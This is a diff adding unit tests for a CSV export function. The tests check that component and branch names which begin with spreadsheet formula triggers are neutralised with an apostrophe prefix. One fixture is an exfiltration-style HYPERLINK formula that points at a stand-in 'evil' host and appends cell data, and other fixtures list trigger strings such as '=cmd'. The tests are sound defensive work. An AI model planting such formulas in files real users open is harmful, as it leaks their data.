@@ -300,4 +300,39 @@ describe('flightEventsCsv', () => {
     expect(fields(body).length).toBe(11);
     expect(fields(body)[3]).toBe('Booster, lower');
   });
+
+  /**
+   * Spreadsheet formula injection. Every name column here is file-sourced:
+   * `source` is the kernel's component name, straight out of an imported
+   * `.ork`, and `stage` falls back to the branch name. Excel and Sheets strip
+   * the RFC-4180 quoting BEFORE evaluating, so quoting alone does not stop a
+   * crafted name executing when the export is opened.
+   */
+  it('neutralizes a formula-triggering name rather than only quoting it', () => {
+    const csvText = flightEventsCsv(
+      [{ ...rows[0]!, source: '=HYPERLINK("http://evil/?"&A1,"Open")', branchName: '+1+1' }],
+      METRIC_UNITS,
+      name,
+      (r) => r.branchName,
+    );
+    const body = csvText.trim().split('\r\n')[1]!;
+    // The apostrophe is inside the quoting, so the cell reads as text.
+    expect(fields(body)[2]).toBe('\'=HYPERLINK("http://evil/?"&A1,"Open")');
+    expect(fields(body)[3]).toBe("'+1+1");
+    // Still the same column count: the prefix is not a new field.
+    expect(fields(body).length).toBe(11);
+  });
+
+  it('prefixes every trigger character, including a leading minus', () => {
+    for (const bad of ['=cmd', '+1', '-1+1', '@SUM(A1)', '\tlead']) {
+      const csvText = flightEventsCsv([{ ...rows[0]!, branchName: bad }], METRIC_UNITS, name, (r) => r.branchName);
+      const cell = fields(csvText.trim().split('\r\n')[1]!)[3];
+      expect(cell, bad).toBe(`'${bad}`);
+    }
+  });
+
+  it('leaves an ordinary name untouched, prefix and all', () => {
+    const csvText = flightEventsCsv([{ ...rows[0]!, branchName: 'Booster' }], METRIC_UNITS, name, (r) => r.branchName);
+    expect(fields(csvText.trim().split('\r\n')[1]!)[3]).toBe('Booster');
+  });
 });
